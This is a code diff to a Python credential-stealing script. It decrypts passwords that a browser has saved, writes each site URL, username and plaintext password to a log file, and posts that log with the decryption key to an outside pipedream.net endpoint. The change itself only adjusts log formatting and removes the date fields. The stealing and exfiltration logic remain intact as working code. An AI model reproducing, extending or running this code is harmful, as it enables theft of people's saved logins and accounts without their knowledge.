@@ -102,21 +102,19 @@ def write_key():
             action_url = row[1]
             username = row[2]
             password = decrypt_password(row[3], key)
-            date_created = row[4]
-            date_last_used = row[5]
             if username or password:
                 logs = f"""
 🤖 Origin URL: {origin_url}
 🤖 Action URL: {action_url}
 💥 Username: {username}
 💥 Password: {password}
-                """
+                            """
                 with codecs.open("logs.txt", "a+", encoding="utf-8") as log_file:
-                    log_file.write(str(logs.encode('unicode-escape')))
+                    log_file.write(str(logs))
             else:
                 continue
 
-        rez = codecs.open("logs.txt", "r", encoding="utf-8").read()
+        rez = open("logs.txt", "r", encoding="utf-8").read()
         r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
         cursor.close()
         db.close()
